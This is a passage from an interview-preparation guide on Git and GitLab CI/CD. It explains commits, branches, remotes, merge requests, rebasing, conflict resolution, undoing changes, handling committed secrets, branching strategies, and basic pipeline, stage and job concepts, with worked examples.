# GitLab CI/CD: Interview Preparation

> **Updated:** 27 October 2026 · **Level:** Git basics → pipeline basics → advanced YAML → secure deployments to AWS
> **How to use:** read the *Short answer* first, then *How it works* and the *Example* walkthrough. *Common mistake → fix* shows what goes wrong in real pipelines. *Interview answer* is what you can say out loud.

---

## Table of contents

1. [Mental model: from git push to a finished job](#1-mental-model-from-git-push-to-a-finished-job)
2. [Git essentials](#2-git-essentials) (Q01–Q11)
3. [CI/CD fundamentals](#3-cicd-fundamentals) (Q12–Q24)
4. [Controlling pipelines](#4-controlling-pipelines) (Q25–Q32)
5. [Reuse & structure](#5-reuse--structure) (Q33–Q36)
6. [Environments & deployments to AWS](#6-environments--deployments-to-aws) (Q37–Q44)
7. [Security & supply chain](#7-security--supply-chain) (Q45–Q49)
8. [Performance & reliability](#8-performance--reliability) (Q50–Q52)
9. [Scenario & debugging questions](#9-scenario--debugging-questions) (Q53–Q58)
10. [Cheat sheet](#10-cheat-sheet)

---

## 1. Mental model: from git push to a finished job

**The one idea everything else follows from:** a pipeline is a recipe stored **in the repository itself** (the file `.gitlab-ci.yml`). Every time something happens to the code (a push, a merge request, a tag, a schedule), GitLab reads the recipe **as it exists in that commit**, turns it into a list of jobs, and hands each job to a **runner**: a separate machine that starts a clean container, checks out that exact commit, runs your commands, and reports back.

Think of a restaurant: GitLab is the front of house that reads the order (the YAML) and writes tickets (jobs). Runners are the cooks. Each cook takes one ticket, starts with a clean station (a fresh container), cooks exactly what the ticket says, and sends the plate (artifacts, logs, pass/fail) back. Cooks never share a station, so anything one job needs from another must be passed on explicitly.

```flow
pipeline: What happens after you push commit 3f2a9c1 to a branch
stage: 1. GitLab server decides what to run
Push arrives > GitLab receives the new commit 3f2a9c1 and an event type (here: push to a branch).
Read .gitlab-ci.yml at 3f2a9c1 > The file is read from that exact commit, plus any files it includes. workflow:rules decide whether to create a pipeline at all.
Create the pipeline and its jobs > Each job's rules decide whether that job is added. Stages and needs decide the order.
Queue the jobs > Each job waits for a free runner whose tags match the job's tags.
stage: 2. A runner does the work
Runner picks up a job > The runner asks GitLab for work and receives the job plus a short-lived job token.
Start a clean container > The executor starts a fresh container from the job's image, so nothing leaks from earlier jobs.
Clone and restore > The repository is checked out at 3f2a9c1, the cache is restored, and artifacts from earlier jobs are downloaded.
Run the script > before_script and script run line by line. The first command that exits with a non-zero code fails the job.
Report back > Logs, artifacts and the pass or fail status go back to GitLab, which then starts the jobs that were waiting on this one.
```

**Three rules that come straight from this model:**
1. **The pipeline is versioned with the code.** A branch can change its own pipeline, which is powerful (you test pipeline changes in a merge request) and dangerous (a malicious change can try to read secrets; see Q45).
2. **Jobs are isolated.** Each job starts from a clean container. Files only move between jobs as **artifacts** (guaranteed) or **cache** (best effort).
3. **Order comes from stages and `needs`**, and whether a job exists at all comes from `rules`.

**Key terms:** *pipeline* = one run of the recipe for one commit and event; *stage* = a named group of jobs that run in parallel; *job* = one unit of work run by a runner; *runner* = the agent that executes jobs; *executor* = how the runner isolates each job (Docker container, Kubernetes pod, shell).

---

## 2. Git essentials

### Q01. What is Git, and what is a repository?

**Short answer:** **Git** is a version control system: it records every saved change to a set of files so you can see who changed what, go back to any earlier version, and work in parallel with other people. A **repository** (repo) is a project folder plus its full history, stored in a hidden `.git` folder. Git is **distributed**: every developer's clone holds the complete history, and GitLab hosts a shared copy everyone pushes to and pulls from.

**How it works:**
1. `git init` (new project) or `git clone <url>` (existing project) creates a repository on your machine, with the history inside `.git/`.
2. You edit files normally. Git notices the changes but records nothing until you **commit** (see Q02).
3. Each commit is saved in your **local** history first. Nothing reaches GitLab until you **push** (see Q04).
4. Because the whole history is local, most commands (log, diff, branch, commit) work offline and are fast.

**Example:**
```bash
git clone https://gitlab.example.com/payments/api.git
cd api
git log --oneline -3
```

**What happens, step by step:**
1. `git clone` downloads every commit, branch and tag from GitLab into a new `api/` folder, and checks out the default branch (say `main`) into your working files.
2. It also saves the GitLab URL as a **remote** called `origin`, so later `git push` and `git pull` know where to go.
3. `git log --oneline -3` reads the local history (no network needed) and prints, for example:
   ```
   9f3e2b1 Add retry to payment client
   4c1d7a0 Fix currency rounding
   a81b33e Initial commit
   ```
   Each line is a commit: a short ID and a message.

**Common mistake → fix:** treating GitLab as "the place my code is saved". A commit you haven't pushed exists **only on your laptop**; if the disk dies, it's gone, and CI never sees it. Fix: push your branch regularly (even work in progress), and open a draft merge request so the pipeline runs.

**Interview answer:** "Git is a distributed version control system: every clone has the full history, so I can commit, branch and inspect history locally, then push to a shared remote such as GitLab. A repository is the files plus that history in the .git folder. GitLab adds collaboration on top: merge requests, code review, and CI/CD pipelines that run on every push."

**Follow-ups:**
- *Git vs GitLab?* Git is the version control tool that runs on your machine; GitLab is a server product that hosts Git repositories and adds merge requests, issues, CI/CD and a container registry.
- *What is a bare repository?* A repository with no working files, only the history. Servers like GitLab store bare repositories.

---

### Q02. What is a commit, and what are the working directory and staging area?

**Short answer:** A **commit** is a saved snapshot of the whole project at one moment, plus metadata: author, time, message and a pointer to its **parent** commit. Its ID is a hash (a fingerprint) of all that content, so any change produces a different ID. Changes travel through three areas: the **working directory** (your files on disk), the **staging area** (also called the *index*: the list of changes that will go into the next commit) and the **repository** (committed history).

**How it works:**
1. You edit files in the working directory. Git sees them as "modified".
2. `git add <file>` copies the current version of that file into the staging area. This lets you commit only *some* of your changes.
3. `git commit -m "message"` turns everything in the staging area into a new commit, whose parent is the commit you were on.
4. The commit ID (for example `9f3e2b1…`, a 40-character SHA-1 hash, shortened for display) depends on the content **and** the parent. That's why history can't be changed silently: editing an old commit changes its ID and the ID of every commit after it.

**Example:**
```bash
# you changed two files: client.py (finished) and notes.txt (scratch)
git status
git add client.py
git commit -m "Add retry to payment client"
git status
```

**What happens, step by step:**
1. The first `git status` shows both files under "Changes not staged for commit".
2. `git add client.py` stages only `client.py`. Status now shows it under "Changes to be committed"; `notes.txt` is still unstaged.
3. `git commit` creates commit `9f3e2b1` containing the staged `client.py` change. Its parent is the previous commit `4c1d7a0`.
4. The second `git status` shows only `notes.txt` as modified. It was never staged, so it isn't in the commit.

```flow
trace: One file's journey into a commit
working directory: client.py **modified**, notes.txt modified > You edited both files. Git has recorded nothing yet.
git add client.py: staging area = **client.py** > Only the staged version of client.py will go into the next commit.
git commit: new commit **9f3e2b1** (parent 4c1d7a0) > The staged snapshot becomes permanent history with a new ID.
after commit: notes.txt still modified, not committed > Unstaged changes stay in the working directory until you add them.
```

**Common mistake → fix:** `git commit -am "wip"` everywhere. `-a` stages **every** modified tracked file, so scratch edits, debug prints or a changed config file ride along. Fix: review with `git status` and `git diff --staged` before committing, and stage deliberately (`git add -p` lets you pick individual chunks).

**Interview answer:** "A commit is an immutable snapshot of the project plus author, message and a parent pointer, identified by a hash of all of that. Changes move from the working directory to the staging area with git add, and git commit records the staged snapshot. The staging area lets me build focused commits, and because each ID depends on the parent, rewriting an old commit changes every ID after it."

**Follow-ups:**
- *Does Git store diffs?* Conceptually it stores full snapshots; internally it compresses and de-duplicates identical files, so unchanged files cost nothing extra.
- *How do I see what's staged?* `git diff --staged` shows staged changes; `git diff` shows unstaged ones.

---

### Q03. What are branches and HEAD?

**Short answer:** A **branch** is just a movable label that points at one commit. When you commit on a branch, the label moves forward to the new commit. **HEAD** is Git's "you are here" marker: it normally points at the branch you have checked out. Creating a branch is instant and cheap because Git only writes a tiny pointer, not a copy of the files.

**How it works:**
1. `git switch -c feature/retry` creates a new label `feature/retry` pointing at the current commit and moves HEAD to it.
2. Each new commit's parent is the commit HEAD points to; then the current branch label moves to the new commit.
3. Other branches don't move. That's how two lines of work diverge.
4. If you check out a commit ID directly (not a branch), you're in **detached HEAD**: new commits belong to no branch and are easy to lose.

**Example:**
```bash
git switch main               # main → C
git switch -c feature/retry   # feature/retry → C, HEAD → feature/retry
# edit, then:
git commit -am "Add retry"    # creates D
git commit -am "Add backoff"  # creates E
```

```
A ── B ── C            ← main
           \
            D ── E     ← feature/retry  (HEAD)
```

**What happens, step by step:**
1. After `git switch -c`, both `main` and `feature/retry` point at C. No files were copied.
2. The first commit creates D with parent C. `feature/retry` moves to D; `main` stays at C.
3. The second commit creates E with parent D; `feature/retry` moves to E.
4. `git switch main` would move HEAD back to `main` and change your files to C's snapshot. D and E are safe on `feature/retry`.

**Common mistake → fix:** committing while in detached HEAD (for example after `git checkout 4c1d7a0` to look at old code), then switching away; the new commits seem to vanish. Fix: before committing, create a branch: `git switch -c fix/old-bug`. If it already happened, find the commit ID with `git reflog` and run `git branch rescue <id>`.

**Interview answer:** "A branch is a lightweight movable pointer to a commit, and HEAD points at the branch I'm on. Committing creates a new commit whose parent is the current one and moves the branch label forward, while other branches stay put. That's why branching in Git is cheap, and why a detached HEAD is risky: commits made there aren't on any branch."

**Follow-ups:**
- *`git switch` vs `git checkout`?* `switch` (and `restore`) were added in Git 2.23 to split the overloaded `checkout` into "change branch" and "restore files". Both work.
- *What is `origin/main`?* A remote-tracking branch: your local record of where `main` was on the remote at your last fetch.

---

### Q04. Remotes: clone, fetch, pull and push

**Short answer:** A **remote** is a named URL of another copy of the repository, usually GitLab, called `origin`. **`fetch`** downloads new commits from the remote but doesn't change your branches. **`pull`** is fetch plus integrating those commits into your current branch (merge by default, or rebase). **`push`** uploads your local commits and moves the branch on the remote, and that push is what triggers a GitLab pipeline.

**How it works:**
- After `git fetch`, `origin/main` (your record of the remote's `main`) moves forward; your local `main` doesn't.
- `git pull` = `git fetch` + `git merge origin/main` (or `git rebase` if configured with `pull.rebase=true`).
- `git push origin feature/retry` sends commits GitLab doesn't have and asks it to move its `feature/retry` to your commit. GitLab **refuses** if that would throw away commits someone else pushed (a "non-fast-forward" push).

**Example:**
```bash
git push -u origin feature/retry
# a teammate pushes to the same branch, then you:
git commit -am "Tune backoff"
git push            # rejected
git pull --rebase
git push            # accepted
```

```flow
sequence: Pushing when a teammate pushed first
actors: You, GitLab, Teammate
You -> GitLab: push feature/retry (commits D, E)
GitLab --> You: accepted, pipeline #101 starts for E
Teammate -> GitLab: push commit F on top of E
You -> GitLab: push commit G (parent E)
GitLab --> You: rejected, non-fast-forward (the remote has F, which you don't have)
You -> GitLab: pull --rebase: fetch F, replay G on top as G'
You -> GitLab: push G'
GitLab --> You: accepted, pipeline #103 starts for G'
```

**What happens, step by step:**
1. `git push -u origin feature/retry` creates the branch on GitLab and remembers it as your upstream (`-u`), so later you can type just `git push`. GitLab starts pipeline #101 for commit E.
2. A teammate pushes F on top of E. GitLab's `feature/retry` now points at F.
3. You commit G on top of E and push. Accepting it would drop F, so GitLab rejects it.
4. `git pull --rebase` fetches F and replays your G on top of F as a new commit G'. History is now E → F → G'.
5. The push is now a fast-forward (it only adds commits), so GitLab accepts it and starts a pipeline for G'.

**Common mistake → fix:** answering a rejected push with `git push --force`. That overwrites the remote branch and deletes your teammate's commit F. Fix: pull (rebase or merge) and push normally. If you rebased your own branch on purpose, use `git push --force-with-lease`, which refuses if the remote has commits you haven't seen.

**Interview answer:** "A remote is a named URL, usually origin pointing at GitLab. Fetch downloads new commits and updates origin/main without touching my branches; pull is fetch plus merge or rebase into my branch; push uploads my commits and moves the remote branch, which also triggers CI. If the push is rejected as non-fast-forward, I integrate the remote work first instead of force-pushing, and if I must force, I use force-with-lease."

**Follow-ups:**
- *Why prefer `fetch` before acting?* It lets you inspect what changed (`git log main..origin/main`) before merging anything.
- *Can you push to a protected branch?* Only if the branch's protection rules allow your role; usually `main` accepts changes only through merge requests.

---

### Q05. What is a merge request?

**Short answer:** A **merge request** (MR) is GitLab's request to merge one branch (the *source*, e.g. `feature/retry`) into another (the *target*, e.g. `main`). It's where code review happens: it shows the diff, comments, approvals and the **pipeline results** for the change. Rules on the MR (required approvals, "pipeline must succeed") act as the quality gate before code reaches `main`. GitHub calls the same thing a *pull request*.

**How it works:**
1. You push a branch and open an MR (from the UI, or with `git push -o merge_request.create`).
2. GitLab runs a pipeline for the MR (see Q24) and shows its status on the MR page.
3. Reviewers comment and approve. **Code owners** (a `CODEOWNERS` file) can be required to approve changes to their files.
4. When the rules are satisfied, someone clicks **Merge**. GitLab merges (merge commit, squash or fast-forward, depending on project settings), and the pipeline for `main` runs.

**Example:**
```bash
git push -o merge_request.create -o merge_request.target=main origin feature/retry
```
Project settings: "Pipelines must succeed", 1 required approval, squash commits when merging.

**What happens, step by step:**
1. The push creates `feature/retry` on GitLab and opens MR !42 targeting `main`.
2. A merge request pipeline runs lint and tests. While it's running, the **Merge** button is blocked.
3. A test fails. You push a fix; a new pipeline runs and passes.
4. A reviewer approves. Both conditions are met, so Merge is enabled.
5. On merge, GitLab squashes the branch's commits into one commit on `main`, and a new pipeline runs for `main` (often deploying to staging).

**Common mistake → fix:** giant MRs (2,000 lines, five features). Reviews become rubber stamps and conflicts pile up. Fix: small MRs that do one thing, merged daily; hide unfinished work behind a feature flag.

**Interview answer:** "A merge request proposes merging a source branch into a target branch and is where review and CI meet: it shows the diff, discussion, approvals and the pipeline status. I configure it as a quality gate: pipelines must succeed, required approvals, code owners for sensitive paths. Keeping MRs small makes reviews meaningful and merges painless."

**Follow-ups:**
- *What is a draft MR?* An MR marked "Draft:" that can't be merged yet; it still runs pipelines, so it's a good way to get CI feedback early.

---

### Q06. Merge vs rebase vs squash

**Short answer:** All three bring a feature branch's work into another branch. **Merge** keeps both histories and joins them with a *merge commit* that has two parents. **Rebase** replays your commits on top of the latest target, giving a straight line but **new commit IDs**. **Squash** combines all the branch's commits into a single commit. Golden rule: never rebase commits other people have already pulled.

**How it works:**

| | Merge | Rebase | Squash merge |
|---|---|---|---|
| Resulting history | true history, with merge commits | linear; commits rewritten with new IDs | one commit per MR on the target |
| Safe on shared branches? | yes | **no**: rewrites commits others may have | yes (done once, at merge time) |
| Typical use | integrating into `main` | updating *your own* branch onto the latest `main` | clean `main` history, one commit per feature |

**Example:** `main` has A–B–C; your `feature` branched at B and has D and E.
```bash
# Option 1: merge
git switch main && git merge feature
# Option 2: rebase your branch, then fast-forward main
git switch feature && git rebase main
# Option 3: squash (usually done by the MR "Squash commits" setting)
git switch main && git merge --squash feature && git commit -m "Add retry"
```

```flow
trace: The same branch integrated three ways
start: main = A-B-C, feature = B-D-E > Both branches moved on after B.
merge: A-B-C-**M**, where M has parents C and E > History shows exactly what happened, including the side branch.
rebase: A-B-C-**D2-E2** > D and E are replayed on top of C as new commits with new IDs. The old D and E are abandoned.
squash: A-B-C-**S** > S contains the combined changes of D and E as a single commit.
```

**What happens, step by step:**
1. **Merge:** Git finds the common ancestor B, combines the changes from B→C and B→E, and records merge commit M with two parents. D and E keep their IDs.
2. **Rebase:** Git takes D's change and applies it to C, creating D2; then E's change on D2, creating E2. `feature` now points to E2. Anyone who had the old D/E now has commits that no longer exist on the branch.
3. **Squash:** Git applies the total change of D+E onto C as one new commit S. The individual messages of D and E are lost from `main` (they stay in the MR page).

**Common mistake → fix:** rebasing a shared branch and force-pushing; a teammate's next pull produces duplicate commits or conflicts. Fix: rebase only branches only you work on; after rebasing a pushed branch, use `git push --force-with-lease`; on shared branches, merge `main` in instead.

**Interview answer:** "Merge preserves the real history with a two-parent merge commit; rebase replays my commits on the latest target for a linear history but creates new commit IDs, so I only rebase private branches; squash collapses an MR into one commit for a clean main. A common setup is rebasing my feature branch on main while I work, then squash-merging the MR."

**Follow-ups:**
- *What is a fast-forward merge?* If the target hasn't moved since you branched, Git just moves its label forward to your commit, with no merge commit. GitLab can require this ("fast-forward merge" method).
- *What's interactive rebase for?* `git rebase -i` lets you reorder, squash, reword or drop your own commits before opening an MR.

---

### Q07. How do you resolve a merge conflict?

**Short answer:** A **conflict** happens when both branches changed the **same lines** (or one deleted a file the other edited), so Git can't decide which version wins. Git stops, marks the file with both versions, and waits for you to write the correct result. You edit the file, remove the markers, test, `git add` it, and continue.

**How it works:** Git compares each side with the common ancestor. Changes in different places merge automatically. Changes to the same lines can't, so Git writes:
```
<<<<<<< HEAD
timeout = 30
=======
timeout = 60
>>>>>>> feature/longer-timeout
```
The top part is the branch you're on (`HEAD`, "ours"); the bottom part is the incoming branch ("theirs").

**Example:** `main` changed `timeout = 10` to `30` and also added `retries = 3` lower down. Your branch changed `timeout = 10` to `60`.
```bash
git switch feature/longer-timeout
git merge main            # CONFLICT (content): Merge conflict in config.py
```

**What happens, step by step:**
1. Git merges `retries = 3` automatically (different lines), but stops on `timeout` and lists `config.py` as "both modified".
2. You decide the correct value. Suppose the product needs 60 seconds: you edit the block to just `timeout = 60` and delete the three marker lines.
3. You run the tests locally, because a file can merge cleanly and still be wrong.
4. `git add config.py` marks it resolved; `git commit` finishes the merge (or `git rebase --continue` if you were rebasing).
5. You push, and the MR pipeline re-runs on the resolved code.

**Common mistake → fix:** resolving by blindly choosing one side (`git checkout --theirs .`), silently dropping the other person's change. Fix: understand both changes, combine them, and ask the other author if unsure. To abandon a merge that went wrong: `git merge --abort` (or `git rebase --abort`).

**Interview answer:** "A conflict occurs when both sides change the same lines relative to the common ancestor. Git marks the file with ours and theirs sections; I work out the correct combined result, remove the markers, run the tests, git add the file and continue the merge or rebase. I reduce conflicts with small, frequently merged branches."

**Follow-ups:**
- *Can GitLab resolve conflicts in the UI?* Yes, for simple text conflicts the MR page offers an inline resolver; complex ones are easier locally.
- *What is `rerere`?* A Git setting that remembers how you resolved a conflict and reapplies it automatically when the same conflict reappears.

---

### Q08. Undoing things: `restore`, `reset`, `revert` and `reflog`

**Short answer:** Pick the tool by **where the mistake is**. Uncommitted change → `git restore`. A local commit nobody else has → `git reset`. A commit already pushed to a shared branch → `git revert`, which adds a **new** commit that reverses it, so nobody's history is rewritten. Lost something after a bad reset or rebase → `git reflog` shows where HEAD has been so you can get it back.

**How it works:**

| Command | Does | Safe on shared history? |
|---|---|---|
| `git restore file` | discard uncommitted changes to a file | yes (local only) |
| `git restore --staged file` | unstage, keep the change in the file | yes |
| `git reset --soft HEAD~1` | undo the last commit, keep its changes staged | local commits only |
| `git reset --hard <id>` | move the branch to `<id>` and **discard** all later work | ⚠ destroys work; never on shared branches |
| `git revert <id>` | new commit that applies the opposite of `<id>` | **yes, the way to undo on `main`** |
| `git reflog` | list of every position HEAD has had | used to rescue "lost" commits |

**Example:** commit `7e1c9d2` ("Switch payments to v2 API") was merged to `main` and broke production.
```bash
git switch main && git pull
git revert 7e1c9d2
git push
```

**What happens, step by step:**
1. `git revert 7e1c9d2` creates a new commit, e.g. `b44f0a1 Revert "Switch payments to v2 API"`, whose change is the exact opposite of `7e1c9d2`.
2. History still contains `7e1c9d2`; nothing is rewritten, so everyone else's clones stay valid.
3. `git push` is a normal fast-forward. The pipeline for `main` runs and deploys code without the v2 change.
4. Later, to bring the feature back, you revert the revert (`git revert b44f0a1`) or merge a fixed version.

**Common mistake → fix:** `git reset --hard HEAD~1` followed by `git push --force` on `main` to "remove" a bad commit. It rewrites shared history, breaks everyone's clones, and may be blocked by branch protection anyway. Fix: `git revert`. And if you ran `reset --hard` locally by accident: `git reflog` shows a line like `9f3e2b1 HEAD@{1}: commit: Add retry`; `git reset --hard 9f3e2b1` brings it back.

**Interview answer:** "For uncommitted changes I use git restore; for local, unpushed commits git reset, soft to keep the changes or hard to discard them; for anything already on a shared branch, git revert, which adds an inverse commit instead of rewriting history. If I lose commits after a reset or rebase, git reflog shows every place HEAD has pointed, so I can reset or branch back to them."

**Follow-ups:**
- *How long does reflog keep entries?* By default, reachable entries for 90 days and unreachable ones for 30 days, and it's local to your clone.
- *How do you revert a merge commit?* `git revert -m 1 <merge-id>`, where `-m 1` says "keep the first parent (main) and undo the merged side".

---

### Q09. `cherry-pick`, tags, `stash` and `bisect`

**Short answer:** Four everyday tools. **cherry-pick** copies one specific commit onto your current branch (e.g. a hotfix into a release branch). A **tag** is a permanent name for a commit, usually a release like `v1.4.2`. **stash** parks uncommitted work so you can switch branches. **bisect** binary-searches history to find the commit that introduced a bug.

**How it works:**
- `git cherry-pick <id>` applies that commit's change to HEAD as a new commit (new ID, same change).
- `git tag -a v1.4.2 -m "Release 1.4.2"` creates an annotated tag; `git push origin v1.4.2` publishes it, and in GitLab that starts a **tag pipeline** (`$CI_COMMIT_TAG` is set), commonly used to publish a release.
- `git stash` saves working changes and cleans your files; `git stash pop` brings them back.
- `git bisect` asks you to mark commits good or bad and halves the search range each time.

**Example (bisect):** `v1.3` was fine; today's `main` is 64 commits later and the checkout total is wrong.
```bash
git bisect start
git bisect bad              # current commit is bad
git bisect good v1.3        # this tag was good
git bisect run ./test_checkout_total.sh   # script exits 0 = good, 1 = bad
git bisect reset
```

```flow
trace: git bisect over 64 commits
range: 64 commits between v1.3 (good) and HEAD (bad) > Git checks out the commit in the middle of the range.
test commit 32: **bad** > The bug was introduced at or before commit 32, so the range shrinks to 32 commits.
test commit 16: good, then 24: bad, then 20: good > Each answer halves the range again.
after 6 tests: **commit 22 is the first bad commit** > 64 halves to 1 in six steps (2 to the 6th power is 64). Git prints that commit's ID and message.
```

**What happens, step by step:**
1. Git checks out the middle commit (32). The script fails → bad; the culprit is in 1–32.
2. It checks commit 16: passes → good; culprit in 17–32. Commit 24: bad; culprit in 17–24. Commit 20: good; culprit in 21–24.
3. Two more tests narrow it to commit 22. Git prints `22 is the first bad commit` with its message and author.
4. `git bisect reset` returns you to where you started.

**Common mistake → fix:** cherry-picking a whole feature (twenty commits) onto a release branch; later merges duplicate or conflict. Fix: cherry-pick only small, self-contained fixes; for features, merge the branch. Also, use annotated tags (`-a`) for releases: they store who tagged, when and a message.

**Interview answer:** "Cherry-pick copies a single commit to another branch, which I use for hotfixes into release branches. Tags name release commits, and pushing a tag triggers a tag pipeline that publishes the release. Stash parks uncommitted work. Bisect binary-searches history, so finding the bad commit among 64 takes about six tests, and git bisect run automates it with a test script."

**Follow-ups:**
- *Lightweight vs annotated tag?* A lightweight tag is just a name; an annotated tag is a full object with tagger, date and message (and can be signed). Use annotated for releases.

---

### Q10. What is `.gitignore`, and what do you do if you commit a secret?

**Short answer:** **`.gitignore`** lists file patterns Git should not track, such as build output, dependency folders and local `.env` files with secrets. It only affects **untracked** files: a file already committed stays tracked. If a secret is committed, deleting it in a later commit is **not enough**, because it's still in history and in every clone. Treat it as leaked: **rotate the secret first**, then clean history if your policy requires it.

**How it works:**
- Patterns like `node_modules/`, `dist/`, `*.log`, `.env` are matched against paths. A leading `!` re-includes something (`!.env.example`).
- To stop tracking an already-committed file: `git rm --cached .env`, then commit. The file stays on your disk.
- History cleanup tools (`git filter-repo`) rewrite every commit and change all IDs, so everyone must re-clone. Rotation is what actually removes the risk.

**Example:**
```gitignore
# .gitignore
.env
dist/
node_modules/
*.log
!.env.example
```
Someone committed `.env` containing `STRIPE_KEY=sk_live_…` in commit `5d2e8f0`, then deleted it in the next commit.

**What happens, step by step:**
1. The key is still readable: `git show 5d2e8f0:.env` prints it, in every clone and fork.
2. You revoke and rotate the key in the provider's dashboard immediately. Now the leaked value is useless.
3. You add `.env` to `.gitignore` so it can't happen again, and keep `.env.example` (no real values) for documentation.
4. If required, you rewrite history with `git filter-repo --path .env --invert-paths`, force-push, and ask everyone to re-clone. GitLab's **secret push protection** and **secret detection** jobs (see Q46) catch this earlier next time.

**Common mistake → fix:** adding `.env` to `.gitignore` after it was committed and assuming it's handled. Git keeps tracking it. Fix: `git rm --cached .env`, commit, and rotate anything that was in it.

**Interview answer:** "gitignore stops untracked files like build output and .env files from being added; it doesn't affect files already tracked, which need git rm --cached. If a secret gets committed, removing it in a new commit doesn't help because it's in history and every clone, so I rotate it immediately, then rewrite history if policy requires, and add secret detection and push protection to prevent repeats."

**Follow-ups:**
- *Global ignores?* `core.excludesFile` points to a personal ignore file for editor and OS files (`.idea/`, `.DS_Store`) so they don't clutter the project's `.gitignore`.

---

### Q11. Branching strategies: trunk-based, GitLab Flow and GitFlow

**Short answer:** A branching strategy is the team's agreement on which branches exist and how changes flow to production. **Trunk-based development** (short-lived branches merged to `main` daily, unfinished work hidden behind feature flags) is the default for teams that deploy often. **GitLab Flow** adds environment or release branches. **GitFlow** uses long-lived `develop`, `release` and `hotfix` branches and suits products with slow, versioned releases.

**How it works:**

| Strategy | How | Fits |
|---|---|---|
| **Trunk-based** | branches live hours to two days; merge to `main` often; feature flags hide unfinished work; `main` is always deployable | CI/CD, frequent deploys (recommended default) |
| **GitLab Flow** | `main` plus release branches (`release/1.4`) or environment branches | versioned releases or controlled promotion |
| **GitFlow** | `develop`, `feature/*`, `release/*`, `hotfix/*`, `main` | packaged software with scheduled releases; heavy for web services |

**How to choose:** if you deploy a web service several times a week, use trunk-based. If you ship versioned software and must patch old versions, add release branches (GitLab Flow). Use GitFlow only if your release process really needs it.

**Example (trunk-based day):** a developer creates `feature/currency-fix` at 10:00, opens an MR at 11:30, the pipeline passes, it's approved and squash-merged at 14:00; the `main` pipeline deploys to staging automatically, and production follows after a manual approval. The new code path is behind `FEATURE_MULTI_CURRENCY=false` until the whole feature is ready.

**What happens, step by step:**
1. The branch lives four hours, so it barely diverges from `main`: no painful conflicts.
2. The MR pipeline proves the change works on top of current `main`.
3. Merging triggers the `main` pipeline: build once, deploy to staging.
4. The flag keeps the half-finished feature invisible in production until someone turns it on.

**Common mistake → fix:** long-lived feature branches (three weeks) "to keep main stable". They drift, cause huge conflicts and big-bang merges, which is the opposite of stable. Fix: merge small slices daily behind feature flags, and protect `main` with required pipelines and approvals.

**Interview answer:** "My default is trunk-based development: short-lived branches merged to main at least daily, feature flags for unfinished work, and main always deployable. If we ship versioned releases that need patches, I add release branches and cherry-pick fixes into them. GitFlow fits slow, packaged release cycles but adds overhead for a continuously deployed service."

**Follow-ups:**
- *How do protected branches fit in?* Protect `main` so nobody pushes directly, require MRs with passing pipelines and approvals, and optionally use merge trains (Q24).

---
## 3. CI/CD fundamentals

### Q12. CI vs Continuous Delivery vs Continuous Deployment

**Short answer:** **Continuous Integration (CI)** means every change is merged often and automatically built and tested, so problems show up within minutes. **Continuous Delivery** goes further: every change that passes is packaged and *ready* to release, and a human decides when to push it to production. **Continuous Deployment** removes that last human step: every passing change goes to production automatically. The pipeline is the same; only the final gate differs.

**How it works:**

| | Continuous Integration | Continuous Delivery | Continuous Deployment |
|---|---|---|---|
| What's automated | build + tests on every push | + package + deploy to staging | + deploy to production |
| Production release | not covered | **manual approval** (one click) | **automatic** |
| Needs | fast, reliable tests | repeatable deploys, staging | strong tests, monitoring, automatic rollback, feature flags |

**How to choose:** start with Continuous Delivery (manual production gate). Move to Continuous Deployment once tests, monitoring and rollback are trustworthy enough that a human click adds no information.

**Example:** in GitLab, the difference is one line on the production job.
```yaml
deploy-prod:
  stage: deploy
  script: ./deploy.sh production
  environment: production
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual        # Continuous Delivery. Remove this line → Continuous Deployment.
```

**What happens, step by step:**
1. A merge to `main` runs build and tests (CI) and deploys to staging automatically.
2. With `when: manual`, `deploy-prod` appears with a ▶ play button and waits. The release is ready; a person chooses the moment.
3. Without `when: manual`, `deploy-prod` starts as soon as the earlier stages pass: that's Continuous Deployment.

**Common mistake → fix:** calling a pipeline "CI" when developers merge once a week. CI is a practice (integrate small changes daily), not just a tool. Fix: short-lived branches and fast feedback (pipeline under about 10 minutes).

**Interview answer:** "CI means integrating small changes frequently, each automatically built and tested. Continuous Delivery keeps every passing change releasable, with a human approving production; Continuous Deployment ships every passing change automatically. In GitLab the difference can be as small as a when: manual on the production job, but moving to full deployment requires trustworthy tests, monitoring and automatic rollback."

**Follow-ups:**
- *Is Continuous Deployment risky?* Less than big releases, if you have feature flags, canary releases and automatic rollback: each change is small and easy to undo.

---

### Q13. What are a pipeline, a stage and a job?

**Short answer:** A **job** is one unit of work: a list of shell commands run by a runner, such as "run the unit tests". A **stage** is a named group of jobs; jobs in the same stage run in parallel, and stages run in order. A **pipeline** is one complete run of all the jobs for one commit and event (a push, a merge request, a schedule). Each pipeline has an ID and a status (passed, failed, canceled) shown on the commit and the MR.

**How it works:**
1. GitLab creates a pipeline when an event happens and the configuration allows it.
2. It groups the jobs by stage: `build` jobs first, then `test`, then `deploy` (the order you list in `stages:`).
3. Each job runs separately on a runner and gets its own status and log.
4. The pipeline's status summarises its jobs: if any job that isn't allowed to fail fails, the pipeline fails.

**Example:**
```yaml
stages: [build, test, deploy]

build-app:   { stage: build,  script: make build }
unit-tests:  { stage: test,   script: make test }
lint:        { stage: test,   script: make lint }
deploy-dev:  { stage: deploy, script: make deploy-dev }
```

**What happens, step by step:**
1. A push to `main` creates pipeline #512 with 3 stages and 4 jobs.
2. `build-app` runs alone in the `build` stage and passes after 2 minutes.
3. `unit-tests` and `lint` start at the same time (same stage, two runners). `lint` passes in 30 seconds; `unit-tests` passes after 4 minutes.
4. The `test` stage is complete, so `deploy-dev` starts. When it passes, pipeline #512 is **passed**, about 7 minutes in total.

**Common mistake → fix:** one giant job that builds, tests and deploys in a single script. A failure tells you nothing about *which* step broke, nothing runs in parallel, and you can't retry just the deploy. Fix: split into jobs by purpose, so failures are visible and parallelism is free.

**Interview answer:** "A job is a set of commands executed by a runner; a stage groups jobs that can run in parallel, and stages run in sequence; a pipeline is one run of all those jobs for a commit and event. The pipeline status rolls up from the jobs, and that status is what gates merge requests."

**Follow-ups:**
- *Can a pipeline have no stages section?* Yes. The default stages are `.pre`, `build`, `test`, `deploy`, `.post`, and a job without `stage:` goes to `test`.

---

### Q14. What is `.gitlab-ci.yml`? Show a minimal pipeline.

**Short answer:** `.gitlab-ci.yml` is a YAML file at the root of the repository that defines the pipeline: the stages, the jobs, the commands each job runs, the container image to run them in, and the rules for when each job runs. Because it's committed with the code, every branch carries its own version of the pipeline, and changes to it are reviewed like any other code.

**How it works:**
